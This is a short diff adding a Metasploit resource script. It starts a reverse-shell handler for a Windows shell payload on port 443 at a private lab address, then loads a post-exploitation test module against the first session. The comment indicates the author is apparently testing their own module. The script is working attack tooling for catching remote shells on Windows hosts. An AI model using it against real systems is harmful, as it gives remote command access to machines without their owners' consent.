@@ -1,0 +1,10 @@
+# rc script to start a rev shell handler and set autorun my test module
+
+use multi/handler
+set payload windows/shell/reverse_tcp
+set lport 443
+set lhost 192.168.227.1
+set exitonsession false
+exploit -j -z
+use post/windows/test/test-services
+set SESSION 1
